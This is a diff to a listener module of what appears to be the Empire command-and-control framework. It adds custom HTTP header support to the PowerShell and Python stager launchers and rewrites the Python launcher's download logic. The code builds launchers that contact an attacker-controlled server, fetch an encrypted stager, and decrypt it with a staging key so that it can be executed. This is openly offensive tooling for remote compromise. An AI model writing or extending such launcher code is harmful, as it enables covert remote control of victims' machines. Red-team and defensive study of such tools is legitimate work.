@@ -6,7 +6,7 @@ import time
 import copy
 from pydispatch import dispatcher
 from flask import Flask, request, make_response
-
+import pdb
 # Empire imports
 from lib.common import helpers
 from lib.common import agents
@@ -158,6 +158,7 @@ class Listener:
             profile = listenerOptions['DefaultProfile']['Value']
             uris = [a for a in profile.split('|')[0].split(',')]
             stage0 = random.choice(uris)
+            customHeaders = profile.split('|')[2:]
 
             if language.startswith('po'):
                 # PowerShell
@@ -216,7 +217,16 @@ class Listener:
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL', meta='STAGE0', additional='None', encData='')
                 b64RoutingPacket = base64.b64encode(routingPacket)
 
+                #Add custom headers if any
+                if customHeaders != []:
+                    for header in customHeaders:
+                        headerKey = header.split(':')[0]
+                        headerValue = header.split(':')[1]
+                        stager += helpers.randomize_capitalization("$wc.Headers.Add(")
+                        stager += "\"%s\",\"%s\");" % (headerKey, headerValue)
+
                 # add the RC4 packet to a cookie
+
                 stager += helpers.randomize_capitalization("$wc.Headers.Add(")
                 stager += "\"Cookie\",\"session=%s\");" % (b64RoutingPacket)
 
@@ -259,23 +269,36 @@ class Listener:
                     profile = listenerOptions['DefaultProfile']['Value']
                     userAgent = profile.split('|')[1]
 
-
-                launcherBase += "o=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['build_opener']).build_opener();"
+                launcherBase += "import urllib2;\n"
                 launcherBase += "UA='%s';" % (userAgent)
                 launcherBase += "server='%s';t='%s';" % (host, stage0)
 
                 # prebuild the request routing packet for the launcher
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='PYTHON', meta='STAGE0', additional='None', encData='')
                 b64RoutingPacket = base64.b64encode(routingPacket)
-
+                
+                launcherBase += "req=urllib2.Request(server+t);\n"
                 # add the RC4 packet to a cookie
-                launcherBase += "o.addheaders=[('User-Agent',UA), (\"Cookie\", \"session=%s\")];\n" % (b64RoutingPacket)
-                launcherBase += "import urllib2\n"
+                launcherBase += "req.add_header('User-Agent',UA);\n"
+                launcherBase += "req.add_header('Cookie',\"session=%s\");\n" % (b64RoutingPacket)
+
+                # Add custom headers if any
+                if customHeaders != []:
+                    for header in customHeaders:
+                        headerKey = header.split(':')[0]
+                        headerValue = header.split(':')[1]
+                        #launcherBase += ",\"%s\":\"%s\"" % (headerKey, headerValue)
+                        launcherBase += "req.add_header(\"%s\",\"%s\");\n" % (headerKey, headerValue)
+
+                
                 launcherBase += "if urllib2.getproxies():\n"
+                launcherBase += "   o = urllib2.build_opener();\n"
                 launcherBase += "   o.add_handler(urllib2.ProxyHandler(urllib2.getproxies()))\n"
+                launcherBase += "   urllib2.install_opener(o);\n"
 
                 # download the stager and extract the IV
-                launcherBase += "a=o.open(server+t).read();"
+                
+                launcherBase += "a=urllib2.urlopen(req).read();\n"
                 launcherBase += "IV=a[0:4];"
                 launcherBase += "data=a[4:];"
                 launcherBase += "key=IV+'%s';" % (stagingKey)
@@ -320,6 +343,7 @@ class Listener:
         uris = [a.strip('/') for a in profile.split('|')[0].split(',')]
         stagingKey = listenerOptions['StagingKey']['Value']
         host = listenerOptions['Host']['Value']
+        customHeaders = profile.split('|')[2:]
 
         # select some random URIs for staging from the main profile
         stage1 = random.choice(uris)
@@ -335,6 +359,11 @@ class Listener:
             # make sure the server ends with "/"
             if not host.endswith("/"):
                 host += "/"
+
+            #Patch in custom Headers
+            if customHeaders != []:
+                headers = ','.join(customHeaders)
+                stager = stager.replace("$customHeaders = \"\";","$customHeaders = \""+headers+"\";")
 
             # patch the server and key information
             stager = stager.replace('REPLACE_SERVER', host)
